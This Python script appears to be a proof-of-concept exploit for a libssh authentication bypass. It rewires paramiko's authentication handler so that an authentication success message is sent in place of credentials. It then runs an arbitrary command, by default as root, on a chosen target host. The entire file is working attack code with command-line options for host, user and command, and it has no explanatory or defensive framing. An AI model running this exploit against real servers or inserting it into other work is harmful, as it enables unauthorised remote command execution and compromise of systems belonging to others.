#!/usr/bin/env python3
import sys, paramiko, logging, argparse


parser = argparse.ArgumentParser(description="libssh bypass authentication program")
parser.add_argument('--host', help='host to attack')
parser.add_argument('-p', '--port', help='libssh port', default=22)
parser.add_argument('-u', '--username', help='username to login with', default='root')
parser.add_argument('-k', '--keyfile', help='ssh keyfile')
parser.add_argument('-c', '--command', help='commands to run', default='ls')

args = parser.parse_args()


def auth_accept(*args, **kwargs): 
    new_auth_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_SUCCESS]
    return new_auth_accept(*args, **kwargs)

 
def attack(hostname, port, username, keyfile, command):
    paramiko.auth_handler.AuthHandler._handler_table.update({paramiko.common.MSG_USERAUTH_REQUEST: auth_accept,})
    logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.WarningPolicy())
    client.connect(hostname, port=int(port), username=username, password="", pkey=None, key_filename=keyfile)
    
    stdin, stdout, stderr = client.exec_command(command)
    
    print(stdout.read(),)
    client.close()


def main():
    try:
        hostname = args.host
        port = args.port
        username = args.username
        keyfile = args.keyfile
        command = args.command
    except:
        parser.print_help()
        sys.exit(1)
    attack(hostname, port, username, keyfile, command)


if __name__ == '__main__': 
    main()
